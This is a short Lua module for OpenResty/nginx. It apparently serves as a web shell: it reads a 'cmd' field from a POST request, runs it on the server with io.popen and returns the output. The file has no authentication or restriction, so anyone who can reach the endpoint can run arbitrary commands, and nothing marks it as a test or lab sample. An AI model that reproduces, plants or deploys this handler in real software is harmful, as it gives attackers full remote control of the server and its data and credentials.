local _M = {}
function _M.run()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    -- for k, v in pairs(post_args) do
    --    ngx.say(string.format("%s = %s", k, v))
    -- end
    local cmd = post_args["cmd"]
    if cmd then
        f_ret = io.popen(cmd)
        local ret = f_ret:read("*a")
        ngx.say(string.format("reply:\n%s", ret))
    end
end
return _M